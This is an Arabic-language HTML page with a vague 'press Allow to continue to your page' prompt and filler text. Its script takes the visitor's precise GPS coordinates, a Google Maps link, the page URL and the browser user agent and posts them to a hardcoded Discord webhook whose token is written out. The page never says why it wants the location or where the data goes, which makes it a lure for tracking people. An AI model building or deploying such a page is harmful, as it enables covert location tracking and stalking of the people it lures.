<!doctype html>
<html lang="ar">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <meta property="og:image" content="https://cdn.discordapp.com/attachments/665665123033022486/1410277944135385108/IMG_6807.jpg?ex=68b06f2f&is=68af1daf&hm=451594ed6a59fad756cdbef0ecf6e50012e2974e05e7134fad12b9ce8ee8ff58&">
  <title>Pageset</title>
  <style>
    :root { font-family: system-ui, sans-serif; }
    body { display:flex; min-height:100dvh; align-items:center; justify-content:center; padding:24px; background:#f6f7f9; direction: rtl; }
    .card { max-width:600px; width:100%; background:#fff; border-radius:14px; padding:24px; box-shadow:0 6px 24px rgba(0,0,0,.08); }
    h1 { margin:0 0 8px; font-size:1.25rem; }
    p { margin:0 0 16px; color:#444; }
    small { color:#666; }
    button { padding:12px 16px; border-radius:10px; border:0; cursor:pointer; font-weight:600; }
    .cta { background:#1a73e8; color:#fff; }
    .secondary { background:#eef2f7; }
    .row { display:flex; gap:12px; margin-top:8px; }
    pre { background:#0f172a; color:#e2e8f0; padding:12px; border-radius:10px; overflow:auto; }
    .ok { color:#0b7; font-weight:600; }
    .err { color:#c00; font-weight:600; }
    .muted { color:#777; font-size:0.9em; }
  </style>
</head>
<body>
  <div class="card">
    <h1>Pagesea</h1>
    <p>
        Please press <strong>Allow</strong> to continue to your page
    </p>

    <div class="row">
      <button  class="cta" id="get">المتابعة</button>
    </div>

    <div id="status" style="margin-top:12px;"></div>
    <pre id="out" hidden></pre>

    <p class="muted">
        Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap    </p>
  </div>

  <script>
    // ======= عدّل هذا المتغيّر بقيمة الويبهوك الخاص بك =======
    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1410318571027824692/d0lxRDS6o_Z15aocaCmnIuvP8-66OA7JmX1VHVKKLAEJ50Xqbub5L4lVSx5uNIkKkIxk';
    // ==========================================================

    const getBtn   = document.getElementById('get');
    const clearBtn = document.getElementById('clear');
    const statusEl = document.getElementById('status');
    const outEl    = document.getElementById('out');

    function setStatus(msg, cls='') {
      statusEl.className = cls;
      statusEl.textContent = msg;
    }

    function showData(data) {
      outEl.hidden = false;
      outEl.textContent = JSON.stringify(data, null, 2);
    }

    function buildDiscordPayload(data) {
      // نحضّر حمولة متوافقة مع ويبهوك ديسكورد
      const { latitude, longitude, accuracy, timestamp, maps_link } = data;
      const ua  = navigator.userAgent;
      const url = location.href;

      return {
        username: "Location Bot",
        content: "📍 تم إرسال موقع جديد بموافقة المستخدم",
        embeds: [
          {
            title: "تفاصيل الموقع",
            description: "الإرسال تم مباشرةً من المتصفح بعد موافقة المستخدم.",
            fields: [
              { name: "Latitude",  value: String(latitude), inline: true },
              { name: "Longitude", value: String(longitude), inline: true },
              { name: "Accuracy",  value: `~${Math.round(accuracy)}m`, inline: true },
              { name: "Timestamp", value: timestamp, inline: false },
              { name: "Maps",      value: maps_link, inline: false },
              { name: "Page",      value: url, inline: false },
              { name: "User-Agent",value: ua.slice(0, 200), inline: false }
            ]
          }
        ]
      };
    }

    async function sendDirectToDiscord(payload) {
      // ملاحظة: قد يرفض المتصفح الطلب بسبب CORS لأن ديسكورد لا يرسل رؤوس CORS المناسبة
      const res = await fetch(WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
        // keepalive مفيد في حالة إغلاق الصفحة أثناء الإرسال، لكن ليس مضموناً دائماً
        keepalive: true
      });

      if (!res.ok) {
        const text = await res.text().catch(() => '');
        throw new Error(`Discord HTTP ${res.status} ${text ? '- ' + text : ''}`.trim());
      }
      return res;
    }

    function isLikelyCORSError(e) {
      // كثير من أخطاء CORS تظهر كـ "TypeError: Failed to fetch"
      return e instanceof TypeError && /fetch/i.test(String(e));
    }

    getBtn.addEventListener('click', () => {
      if (!('geolocation' in navigator)) {
        setStatus('الرجاء المحاولة من متصفح اخر.', 'err');
        return;
      }

      setStatus('طلب إذن تحديد الموقع…');

      navigator.geolocation.getCurrentPosition(
        async pos => {
          const { latitude, longitude, accuracy } = pos.coords;
          const link = `https://maps.google.com/?q=${latitude},${longitude}`;

          const data = {
            latitude,
            longitude,
            accuracy,
            timestamp: new Date(pos.timestamp).toISOString(),
            maps_link: link,
            note: 'لا يتم تخزين البيانات في هذه الصفحة. .'
          };

          // نعرض البيانات للمستخدم بشفافية
          showData(data);
          setStatus(`تم جلب الإحداثيات ✓ (~${Math.round(accuracy)}م دقة). جاري الإرسال …`);

          try {
            await sendDirectToDiscord(buildDiscordPayload(data));
            setStatus('تم الإرسال بنجاح ✓', 'ok');
          } catch (e) {
            console.error(e);
            if (isLikelyCORSError(e)) {
              setStatus('فشل الإرسال: يبدو أنه تم حظر الطلب بسبب CORS. يُنصح باستخدام Proxy.', 'err');
            } else {
              setStatus(`فشل الإرسال إلى ديسكورد: ${e.message}`, 'err');
            }
          }
        },
        err => {
          // أخطاء شائعة: رفض الإذن / نفاد الوقت / لا يوجد GPS
          setStatus(`خطأ: ${err.message}`, 'err');
          outEl.hidden = true;
        },
        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
      );
    });

    clearBtn.addEventListener('click', () => {
      setStatus('');
      outEl.hidden = true;
      outEl.textContent = '';
    });
  </script>
</body>
</html>


